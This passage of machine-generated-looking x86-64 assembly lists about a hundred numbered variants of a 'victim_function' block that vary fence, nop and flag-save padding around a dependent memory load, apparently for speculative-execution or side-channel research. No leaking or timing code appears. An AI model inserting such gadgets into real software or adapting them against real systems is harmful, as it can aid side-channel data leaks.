	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 446
.Lvictim_function_win0_var446:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 447
.Lvictim_function_win0_var447:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 448
.Lvictim_function_win0_var448:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 449
.Lvictim_function_win0_var449:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 450
.Lvictim_function_win0_var450:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 451
.Lvictim_function_win0_var451:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 452
.Lvictim_function_win0_var452:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 453
.Lvictim_function_win0_var453:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 454
.Lvictim_function_win0_var454:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 455
.Lvictim_function_win0_var455:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 456
.Lvictim_function_win0_var456:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 457
.Lvictim_function_win0_var457:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	movq	(%rax), %rax
	nop
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 458
.Lvictim_function_win0_var458:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 459
.Lvictim_function_win0_var459:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 460
.Lvictim_function_win0_var460:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 461
.Lvictim_function_win0_var461:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 462
.Lvictim_function_win0_var462:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 463
.Lvictim_function_win0_var463:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 464
.Lvictim_function_win0_var464:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 465
.Lvictim_function_win0_var465:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 466
.Lvictim_function_win0_var466:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 467
.Lvictim_function_win0_var467:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 468
.Lvictim_function_win0_var468:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 469
.Lvictim_function_win0_var469:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 470
.Lvictim_function_win0_var470:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 471
.Lvictim_function_win0_var471:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 472
.Lvictim_function_win0_var472:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 473
.Lvictim_function_win0_var473:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 474
.Lvictim_function_win0_var474:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 475
.Lvictim_function_win0_var475:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 476
.Lvictim_function_win0_var476:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 477
.Lvictim_function_win0_var477:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 478
.Lvictim_function_win0_var478:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 479
.Lvictim_function_win0_var479:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 480
.Lvictim_function_win0_var480:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 481
.Lvictim_function_win0_var481:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 482
.Lvictim_function_win0_var482:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 483
.Lvictim_function_win0_var483:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 484
.Lvictim_function_win0_var484:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 485
.Lvictim_function_win0_var485:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 486
.Lvictim_function_win0_var486:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 487
.Lvictim_function_win0_var487:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 488
.Lvictim_function_win0_var488:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 489
.Lvictim_function_win0_var489:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 490
.Lvictim_function_win0_var490:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 491
.Lvictim_function_win0_var491:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 492
.Lvictim_function_win0_var492:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 493
.Lvictim_function_win0_var493:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 494
.Lvictim_function_win0_var494:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 495
.Lvictim_function_win0_var495:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 496
.Lvictim_function_win0_var496:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 497
.Lvictim_function_win0_var497:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 498
.Lvictim_function_win0_var498:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 499
.Lvictim_function_win0_var499:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 500
.Lvictim_function_win0_var500:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 501
.Lvictim_function_win0_var501:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 502
.Lvictim_function_win0_var502:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 503
.Lvictim_function_win0_var503:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 504
.Lvictim_function_win0_var504:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 505
.Lvictim_function_win0_var505:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 506
.Lvictim_function_win0_var506:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 507
.Lvictim_function_win0_var507:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 508
.Lvictim_function_win0_var508:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 509
.Lvictim_function_win0_var509:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 510
.Lvictim_function_win0_var510:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 511
.Lvictim_function_win0_var511:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 512
.Lvictim_function_win0_var512:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 513
.Lvictim_function_win0_var513:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 514
.Lvictim_function_win0_var514:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 515
.Lvictim_function_win0_var515:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 516
.Lvictim_function_win0_var516:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 517
.Lvictim_function_win0_var517:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 518
.Lvictim_function_win0_var518:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 519
.Lvictim_function_win0_var519:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 520
.Lvictim_function_win0_var520:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 521
.Lvictim_function_win0_var521:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 522
.Lvictim_function_win0_var522:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 523
.Lvictim_function_win0_var523:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 524
.Lvictim_function_win0_var524:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	nop
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 525
.Lvictim_function_win0_var525:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 526
.Lvictim_function_win0_var526:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 527
.Lvictim_function_win0_var527:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 528
.Lvictim_function_win0_var528:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 529
.Lvictim_function_win0_var529:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 530
.Lvictim_function_win0_var530:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 531
.Lvictim_function_win0_var531:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 532
.Lvictim_function_win0_var532:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 533
.Lvictim_function_win0_var533:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 534
.Lvictim_function_win0_var534:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 535
.Lvictim_function_win0_var535:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 536
.Lvictim_function_win0_var536:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 537
.Lvictim_function_win0_var537:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 538
.Lvictim_function_win0_var538:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 539
.Lvictim_function_win0_var539:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 540
.Lvictim_function_win0_var540:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 541
.Lvictim_function_win0_var541:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 542
.Lvictim_function_win0_var542:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 543
.Lvictim_function_win0_var543:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
